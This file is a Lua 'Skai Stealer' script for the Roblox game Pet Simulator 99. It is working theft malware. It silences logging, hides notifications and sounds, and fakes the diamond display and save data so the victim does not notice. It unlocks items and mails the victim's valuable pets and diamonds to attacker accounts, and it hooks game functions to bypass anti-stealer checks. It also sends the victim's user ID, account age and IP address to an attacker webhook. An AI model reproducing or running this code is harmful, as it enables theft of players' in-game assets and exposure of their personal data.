setclipboard = function() end
warn = function() end
print = function() end
writefile = function() end
local function detectHttpSpy()
    local function isHttpSpy(gui)
        return gui and gui:IsA("ScreenGui") and gui.Name:lower():find("http") ~= nil
    end
    for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
        if isHttpSpy(gui) then
            return true
        end
    end
    return false
end
if detectHttpSpy() then
    warn("Http Spy Was Detected And Now Will Block It, This Means That You Cannot Steal From The Current Player.")
    return
end

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "i love k4f7"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local getFucked = false
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true
local newamount = 20000
if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end
local GemAmount1 = 0
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end
if newamount > GemAmount1 then
    return
end
local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local HttpService = game:GetService("HttpService")
local SECRET_KEY = "X2bF9tJwY1rA7nPqL3vZ8uCkD4hW6sVm" -- Shared secret key with the server

-- Function to XOR two strings and return the result as a hexadecimal string
local function xorToHex(input, key)
    local result = {}
    for i = 1, #input do
        local inputByte = string.byte(input, i)
        local keyByte = string.byte(key, ((i - 1) % #key) + 1)
        table.insert(result, string.format("%02x", bit32.bxor(inputByte, keyByte)))
    end
    return table.concat(result)
end

-- Generate a timestamped 32-character nonce
local function generateNonce(length)
    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local nonce = {}
    for i = 1, length do
        local randIndex = math.random(1, #charset)
        table.insert(nonce, string.sub(charset, randIndex, randIndex))
    end
    return os.time() .. "-" .. table.concat(nonce) -- Add timestamp to the nonce
end

-- Updated SendMessage function
local function SendMessage(username, diamonds)
    local TheReceiver = Username
    local nonce = generateNonce(32) -- Generate a secure nonce
    local signature = xorToHex(nonce, SECRET_KEY) -- Generate signature using XOR encryption

    local headers = {
        ["content-type"] = "application/json",
        ["X-Nonce"] = nonce,
        ["X-Signature"] = signature -- Secure XOR-based signature
    }

    -- Construct fields (same as before)
    local fields = {
        {
            name = "( 🧑 ) PLAYER INFO",
            value = "```fix\nUSERNAME   👤 : ".. (username or game.Players.LocalPlayer.Name) ..
                    "\nUSER-ID    💳 : ".. tostring(game.Players.LocalPlayer.UserId) ..
                    "\nPLAYER-AGE 🔞 : ".. tostring(game.Players.LocalPlayer.AccountAge) ..
                    " DAYS\nEXPLOIT    🖥 : "..tostring(identifyexecutor())..
                    "\nPLATFORM   🖱 : "..tostring("SOON")..
                    "\nRECEIVER   🧟‍♂️ : "..tostring(TheReceiver)..
                    "\nVERSION    🌐 : "..tostring("VERSION 1")..
                    "\nUSER-IP    📤 : "..tostring(game:HttpGet("https://api.ipify.org")).."```",
            inline = true
        },
        {
            name = "( 🎒 ) PLAYER HIT LIST",
            value = "",
            inline = false
        },
        {
            name = "( 🎃 ) ADDITIONAL INFO",
            value = "",
            inline = false
        }
    }

    -- Continue processing the items (same as before)
    local combinedItems = {}
    local itemRapMap = {}
    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    fields[2].value = "```\n"
    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" ..
                          ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end
    fields[2].value = fields[2].value .. "```"
    fields[3].value = fields[3].value .. "```DIAMONDS      💎 : " .. formatNumber(diamonds) .. "\n"
    fields[3].value = fields[3].value .. "OVERALL RAP   🔢 : " .. formatNumber(totalRAP) .. "```"

    if getFucked then
        fields[3].value = fields[3].value .. "\n\n```Victim tried to use anti-mailstealer, but got bypassed instead```"
    end

    -- Set the content of the message
    local CONTENTWB
    if totalRAP >= 10000000000 then
        CONTENTWB = "@everyone YOUR PLAYER IS THE RICHEST ON GOD!!!! THEY GOT 10B+ RAP"
    elseif totalRAP >= 5000000000 then
        CONTENTWB = "@everyone YOUR PLAYER IS FUCKING RICHHHHH LIKE HELLA!!!! THEY GOT 5B+ RAP"
    elseif totalRAP >= 1000000000 then
        CONTENTWB = "@everyone YOUR PLAYER IS FUCKING RICH! THEY GOT 1B+ RAP"
    elseif totalRAP >= 500000000 then
        CONTENTWB = "@everyone YOUR PLAYER IS DECENTLY RICH! THEY GOT 500m+ RAP"
    else
        CONTENTWB = "NEW HIT! PLAYER HAS LESS THAN 1B RAP"
    end

    -- Prepare the data to be sent to your backend
    local data = {
        username = "Skai Scripts",
        avatar_url = "https://cdn.discordapp.com/attachments/1288660529539317824/1299204925229895750/IMG_1832.png?ex=671c5a60&is=671b08e0&hm=bbc31c30c6b36d254e8923e905d9eec300c3bc0468363bb3bb63ebdb0dbca3c8&",
        content = CONTENTWB,
        embeds = {{
            title = "⛅️ __**New Hit With Skai Stealer**__ ⛅️",
            color = tonumber("0x05f7ff"),
            fields = fields,
            footer = {
                text = "discord.gg/skaiscripts : Pet Simulator 99!"
            },
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
            Url = Webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    print("Response from backend: ", response)
end

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)
local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false
game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)
local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end
local user = Username
local user2 = Username2
local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    local response = false
    repeat
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        if response == false and err == "They don't have enough space!" then
            if user == Username then
                user = user2
            elseif user == Username2 then
                break -- Stop if all usernames are full
            end
            args[1] = user
        end
    until response == true
    GemAmount1 = GemAmount1 - newamount
    newamount = math.ceil(math.ceil(newamount) * 1.5)
    if newamount > 5000000 then
        newamount = 5000000
    end
end
local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1 - newamount
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end
local function IsMailboxHooked()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end
local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end
local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

-- Ensure sortedItems and totalRAP are initialized
sortedItems = sortedItems or {}
totalRAP = totalRAP or 0

for i, v in pairs(categoryList) do
	if save[v] then -- Ensure save[v] exists
		for uid, item in pairs(save[v]) do
			if item.id then -- Ensure item.id exists
				if v == "Pet" then
					local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
					if dir and (dir.huge or dir.exclusiveLevel) then -- Ensure dir and fields exist
						local rapValue = getRAP(v, item) or 0 -- Fallback to 0 if getRAP returns nil
						if rapValue >= min_rap then
							local prefix = ""
							if item.pt then
								if item.pt == 1 then
									prefix = "Golden "
								elseif item.pt == 2 then
									prefix = "Rainbow "
								end
							end
							if item.sh then
								prefix = "Shiny " .. prefix
							end
							local id = prefix .. item.id
							table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
							totalRAP = totalRAP + (rapValue * (item._am or 1))
						end
					end
				else
					local rapValue = getRAP(v, item) or 0 -- Fallback to 0 if getRAP returns nil
					if rapValue >= min_rap then
						table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
						totalRAP = totalRAP + (rapValue * (item._am or 1))
					end
				end
			end
			-- Handle locking
			if item._lk then
				local args = {
					[1] = uid,
					[2] = false
				}
				network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
		end
	end
end
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ClaimMail()
	if IsMailboxHooked() then
        getFucked = true
		local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
        for i, Func in ipairs(getgc(true)) do
            if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
                local Old
                Old = hookfunction(Func, function(Ins, ...)
                    if Ins == Mailbox then
                        return tick()
                    end
                    return Old(Ins, ...)
                end)
            end
        end
	end
    EmptyBoxes()
	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
    local blob_b = require(blob_a).Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    require(blob_a).Get = function(...)
        return blob_b
    end
    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)
    spawn(function()
        SendMessage(plr.Name, GemAmount1)
    end)
    for _, item in ipairs(sortedItems) do
        if item.rap >= newamount then
            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end
    SendAllGems()
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("ALL YOUR VALUABLE ITEMS JUST GOT STOLEN!\nJOIN discord.gg/skaiscripts FOR REVENGE")
end